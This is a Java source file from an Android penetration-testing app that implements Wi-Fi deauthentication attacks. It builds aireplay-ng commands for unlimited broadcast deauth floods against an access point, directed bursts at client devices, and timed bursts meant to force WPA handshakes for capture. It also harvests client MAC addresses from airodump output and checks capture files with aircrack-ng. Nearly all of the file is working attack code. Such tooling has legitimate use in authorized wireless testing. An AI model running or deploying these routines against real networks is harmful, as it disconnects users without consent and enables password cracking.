package com.zalexdev.stryker.wifi;

import androidx.annotation.Nullable;

import com.zalexdev.stryker.utils.Core;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Shared deauth helpers.
 * <ul>
 *   <li>Single-AP deauth: continuous flood (broadcast forever + directed clients).</li>
 *   <li>Handshake capture: short bursts then wait (wifite-style) so clients can reconnect.</li>
 * </ul>
 */
public final class WifiDeauthEngine {

    /** Seconds to wait after a HS burst before the next one (wifite-style). */
    public static final int BURST_INTERVAL_SEC = 10;

    /** Frames per broadcast burst during handshake capture. */
    public static final int BROADCAST_COUNT = 5;

    /** Frames per directed (client) burst during handshake capture. */
    public static final int CLIENT_COUNT = 3;

    /** Directed frames while continuous broadcast is already running. */
    public static final int DIRECTED_WHILE_FLOOD = 5;

    private static final Pattern MAC_RE =
            Pattern.compile("(?i)((?:[0-9a-f]{2}:){5}[0-9a-f]{2})");

    public interface LineSink {
        void onLine(String line);
    }

    private WifiDeauthEngine() {
    }

    /** Continuous unlimited broadcast deauth (single-AP attack). */
    public static String continuousBroadcastCmd(String iface, String bssid) {
        return String.format(Locale.US,
                "aireplay-ng --ignore-negative-one -0 0 -a %s %s 2>&1",
                bssid.trim(), iface);
    }

    /** Continuous unlimited directed deauth at one client. */
    public static String continuousClientCmd(String iface, String bssid, String client) {
        return String.format(Locale.US,
                "aireplay-ng --ignore-negative-one -0 0 -a %s -c %s %s 2>&1",
                bssid.trim(), client.trim(), iface);
    }

    /**
     * Fire one HS burst: broadcast + directed clients. Streams every aireplay
     * line to {@code sink}. Blocking — call from a worker thread.
     */
    public static String fireBurst(Core core, String iface, String bssid,
                                   @Nullable Iterable<String> clients,
                                   @Nullable LineSink sink) {
        if (core == null || iface == null || bssid == null) {
            return "deauth skipped (missing args)";
        }
        String b = bssid.trim();
        StringBuilder log = new StringBuilder();

        String bcCmd = String.format(Locale.US,
                "aireplay-ng --ignore-negative-one -0 %d -a %s %s 2>&1",
                BROADCAST_COUNT, b, iface);
        logLine(sink, "[deauth] " + bcCmd);
        ArrayList<String> bcOut = core.customChrootCommand(bcCmd);
        for (String line : bcOut) logLine(sink, "  " + line);
        log.append("broadcast x").append(BROADCAST_COUNT);
        if (looksFailed(bcOut)) {
            log.append(" (warn)");
            logLine(sink, "[deauth] broadcast may have failed — check channel/injection");
        }

        Set<String> unique = new LinkedHashSet<>();
        if (clients != null) {
            for (String c : clients) {
                if (c == null) continue;
                String mac = c.trim().toLowerCase(Locale.US);
                if (!mac.contains(":") || mac.equalsIgnoreCase(b)) continue;
                unique.add(mac);
            }
        }
        int n = 0;
        for (String client : unique) {
            String cmd = String.format(Locale.US,
                    "aireplay-ng --ignore-negative-one -0 %d -a %s -c %s %s 2>&1",
                    CLIENT_COUNT, b, client, iface);
            logLine(sink, "[deauth] " + cmd);
            ArrayList<String> out = core.customChrootCommand(cmd);
            for (String line : out) logLine(sink, "  " + line);
            n++;
        }
        if (n > 0) {
            log.append(" + ").append(n).append(" client(s) x").append(CLIENT_COUNT);
        } else {
            log.append(" (no clients yet — broadcast only)");
            logLine(sink, "[deauth] no associated clients seen yet");
        }
        return log.toString();
    }

    /** Convenience overload without a log sink. */
    public static String fireBurst(Core core, String iface, String bssid,
                                   @Nullable Iterable<String> clients) {
        return fireBurst(core, iface, bssid, clients, null);
    }

    /**
     * Short directed burst while a continuous broadcast aireplay is already running.
     */
    public static void fireDirectedBurst(Core core, String iface, String bssid,
                                         String client, @Nullable LineSink sink) {
        if (core == null || iface == null || bssid == null || client == null) return;
        String cmd = String.format(Locale.US,
                "aireplay-ng --ignore-negative-one -0 %d -a %s -c %s %s 2>&1",
                DIRECTED_WHILE_FLOOD, bssid.trim(), client.trim(), iface);
        logLine(sink, "[deauth→client] " + cmd);
        for (String line : core.customChrootCommand(cmd)) {
            logLine(sink, "  " + line);
        }
    }

    public static ArrayList<String> copyClients(Iterable<String> source) {
        ArrayList<String> out = new ArrayList<>();
        if (source == null) return out;
        for (String c : source) {
            if (c != null && c.contains(":")) out.add(c.trim());
        }
        return out;
    }

    /** Extract station MACs from an airodump line (skips the AP BSSID). */
    public static void collectClientsFromAirodump(String line, String bssid,
                                                  ArrayList<String> clients,
                                                  @Nullable LineSink sink) {
        if (line == null || clients == null) return;
        Matcher m = MAC_RE.matcher(line);
        while (m.find()) {
            String mac = m.group(1);
            if (mac == null) continue;
            if (bssid != null && mac.equalsIgnoreCase(bssid)) continue;
            // Skip multicast / broadcast-ish
            if (mac.equalsIgnoreCase("ff:ff:ff:ff:ff:ff")) continue;
            boolean known = false;
            for (String c : clients) {
                if (c.equalsIgnoreCase(mac)) {
                    known = true;
                    break;
                }
            }
            if (!known) {
                clients.add(mac);
                logLine(sink, "[airodump] client " + mac);
            }
        }
    }

    public static boolean lineHasHandshake(String line) {
        if (line == null) return false;
        String l = line.toLowerCase(Locale.US);
        return l.contains("wpa handshake:") || l.contains("handshake:");
    }

    public static boolean lineHasPmkid(String line) {
        if (line == null) return false;
        return line.toUpperCase(Locale.US).contains("PMKID");
    }

    /** aircrack-ng quick check that a .cap contains at least one handshake. */
    public static boolean capHasHandshake(Core core, String capPath) {
        if (core == null || capPath == null) return false;
        ArrayList<String> out = core.customChrootCommand(
                "aircrack-ng " + shellQuote(capPath) + " 2>&1 | head -n 60", true);
        Pattern hs = Pattern.compile("(?i)(\\d+)\\s+handshake");
        for (String line : out) {
            if (line == null) continue;
            Matcher m = hs.matcher(line);
            if (m.find()) {
                try {
                    return Integer.parseInt(m.group(1)) > 0;
                } catch (NumberFormatException ignored) {
                    // continue
                }
            }
        }
        return false;
    }

    private static boolean looksFailed(ArrayList<String> out) {
        if (out == null || out.isEmpty()) return false;
        for (String line : out) {
            if (line == null) continue;
            String l = line.toLowerCase(Locale.US);
            if (l.contains("waiting for beacon")
                    || l.contains("channel -1")
                    || l.contains("no such device")
                    || l.contains("device or resource busy")
                    || (l.contains("injection") && l.contains("failed"))) {
                return true;
            }
        }
        return false;
    }

    private static void logLine(@Nullable LineSink sink, String line) {
        if (sink != null && line != null) sink.onLine(line);
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }
}
